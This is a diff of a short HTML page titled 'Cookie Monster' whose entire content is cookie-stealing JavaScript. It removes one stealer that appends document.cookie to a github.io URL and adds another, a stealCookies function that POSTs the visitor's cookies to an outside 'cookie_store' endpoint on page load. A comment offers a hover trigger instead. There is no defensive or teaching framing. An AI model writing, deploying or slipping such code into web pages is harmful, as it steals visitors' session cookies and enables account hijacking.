@@ -1,11 +1,21 @@
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Monster</title>
+</head>
 <body>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            var http = new XMLHttpRequest();
-            http.open("GET", "https://db011.github.io/idk-test-maye/stealcookies.php" + document.cookie, true);
-            http.send();
-        });
+        function stealCookies() {
+            var cookies = document.cookie;
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open("POST", "https://db011.github.io/idk-test-maye/cookie_store", false);
+            xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xmlHttp.send('stolen_cookies=' + encodeURIComponent(cookies));
+        }
+
+        // Replace "onload" with "onmouseover" if you want the script to trigger when hovering over the page
+        window.onload = stealCookies;
     </script>
 </body>
 </html>
